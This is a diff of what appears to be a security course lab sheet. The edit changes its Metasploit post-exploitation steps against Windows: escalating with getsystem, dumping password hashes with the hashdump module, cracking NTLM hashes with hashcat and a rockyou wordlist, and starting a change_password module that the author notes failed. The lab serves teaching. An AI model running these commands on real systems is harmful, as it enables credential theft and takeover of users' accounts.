@@ -102,13 +102,15 @@ You may follow this [installation video](https://youtu.be/qKudXchmnWc) to instal
     getsystem
     getuid
     # 3. dump the hashes
-    hashdump # save the result in a text file
-    # 4. crack the hashes
-    john --wordlist=pass_dict.txt --format=NT hashes.txt
+    run post/windows/gather/hashdump # save the result in a text file userhashes.txt
+    # 4. crack the hashes, download hashcat.7z from tools folder,
+    # or from https://github.com/attackdebris/hashcat-2.0 and extract it
+    # hashes.txt contains only the hashes of userhashes.txt
+    hashcat-cli64.bin -m 1000 -a 0 -o winpass.txt --remove hashes.txt rockyou.txt 
     ```
-    2. (10%) Change Windows users' password. Use a user found above, replace oldpass and newpass with yours
+    1. (10%) Change Windows users' password. Use a user found above, replace oldpass and newpass with yours
     ```bash
-    # Inside msf
+    # Inside msf, failed somehow. Changing passwords can be done in Task 10.4 above using net users command
     msf > use post/windows/manage/change_password
     msf post(change_password) > set smbuser user_name
     msf post(change_password) > set old_password oldpass
